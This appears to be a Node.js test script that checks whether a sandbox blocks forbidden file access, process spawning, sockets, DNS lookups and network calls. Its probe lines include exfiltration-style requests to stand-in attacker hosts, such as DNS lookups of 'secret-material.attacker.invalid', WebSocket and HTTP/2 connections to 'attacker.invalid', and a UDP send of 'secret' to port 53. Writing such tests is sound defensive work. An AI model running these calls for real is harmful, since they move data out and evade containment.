import { spawnSync } from "node:child_process";
import dns from "node:dns";
import dnsPromises from "node:dns/promises";
import dgram from "node:dgram";
import { readFileSync, writeFileSync } from "node:fs";
import http2 from "node:http2";
import net, { connect } from "node:net";

function codeOf(operation) {
  try {
    operation();
    return null;
  } catch (error) {
    return error?.code ?? error?.name ?? "UNKNOWN";
  }
}

const allowedRoot = process.env.XW_TEST_ALLOWED_ROOT;
const forbiddenPath = process.env.XW_TEST_FORBIDDEN_PATH;
const result = {
  allowedRead: readFileSync(`${allowedRoot}/read.txt`, "utf8").trim(),
  allowedWriteCode: codeOf(() => writeFileSync(`${allowedRoot}/write.txt`, "ok\n")),
  forbiddenReadCode: codeOf(() => readFileSync(forbiddenPath, "utf8")),
  forbiddenWriteCode: codeOf(() => writeFileSync(`${forbiddenPath}.write`, "no\n")),
  childProcessCode: codeOf(() => spawnSync(process.execPath, ["--version"])),
  directSocketCode: codeOf(() => connect({ host: "127.0.0.1", port: 22222 })),
  socketPrototypeCode: codeOf(() => new net.Socket().connect(22222, "127.0.0.1")),
  serverListenCode: codeOf(() => new net.Server().listen(0)),
  dgramConstructorCode: codeOf(() => new dgram.Socket("udp4").send("secret", 53, "127.0.0.1")),
  http2ConnectCode: codeOf(() => http2.connect("https://attacker.invalid")),
  webSocketCode: codeOf(() => new WebSocket("wss://attacker.invalid")),
  dnsSetServersCode: codeOf(() => dns.setServers(["127.0.0.1"])),
  dnsResolveCode: codeOf(() => dns.resolve4("secret-material.attacker.invalid", () => {})),
  dnsResolverCode: codeOf(() => new dns.Resolver()),
  dnsPromisesResolverCode: codeOf(() => new dnsPromises.Resolver()),
  inheritedControlDb: Object.hasOwn(process.env, "CONTROL_PLANE_DB"),
  inheritedRawDevice: Object.hasOwn(process.env, "ANDROID_SERIAL"),
};

try {
  await dnsPromises.resolve4("secret-material.attacker.invalid");
  result.dnsPromisesResolveCode = null;
} catch (error) {
  result.dnsPromisesResolveCode = error?.code ?? error?.name ?? "UNKNOWN";
}

try {
  await fetch("http://127.0.0.1:17920/control/v1/health");
  result.forbiddenFetchCode = null;
} catch (error) {
  result.forbiddenFetchCode = error?.code ?? error?.name ?? "UNKNOWN";
}

process.stdout.write(`${JSON.stringify(result)}\n`);
